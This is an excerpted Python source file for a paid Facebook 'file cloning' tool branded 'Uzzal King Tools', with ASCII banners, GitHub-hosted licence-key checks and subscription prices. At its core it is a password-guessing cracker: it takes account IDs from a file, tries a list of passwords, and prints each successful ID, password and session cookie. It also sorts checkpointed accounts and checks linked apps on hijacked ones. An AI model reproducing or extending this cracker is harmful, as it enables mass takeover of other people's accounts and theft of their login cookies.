...
princp=[]
try:
	prox= requests.get('https://github.com/Uzzal15/UZZAL-KING/blob/main/Approval.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mUzzal')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Uzzal15/Faild-Uzzal/blob/main/Approved.txt').text
		ua=open('.bbnew.txt','w')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Uzzal' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  Uzzal,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/itzUzzalVau2008')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m ██    ██\033[0;92m ███████ \033[0;91m ███████ \033[0;92m.   ║
║\033[0;91m ██    ██\033[0;92m            ███\033[0;91m             ███\033[0;92m     ║
║\033[0;91m ██    ██\033[0;92m       ███\033[0;91m             ███ \033[0;92m         ║
║\033[0;91m ██    ██\033[0;92m    ███  \033[0;91m           ███\033[0;92m             ║
║\033[0;91m  ██████ \033[0;92m ███████\033[0;91m  ███████\033[0;92m  ║
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Uzzal ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Uzzal King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mUzzal-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01843438888 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	Uzzalj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Uzzalj('\033[0;97m===============================================')
	Uzzal= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Uzzal in ['m']:
		public()
	elif Uzzal in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/Uzzal.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Uzzal-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Uzzal-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Uzzal-Cp] {idf} • {pw}')     
				...
				#Uzzal-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Uzzal-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Uzzal,  Ok,  id"')
...
def cek_apk(coki):
    ...
    if len(game)==0:
        print(f'\r%s[%s×%s] %\033[0;106m & WEBSITE NOT FOUND ‼️\033[0;102m %s'%(N,M,N,M,N))
    else:
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Uzzal15/Faild-Uzzal/blob/main/Approved.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Uzzal King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Uzzal+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Uzzal+''+key1
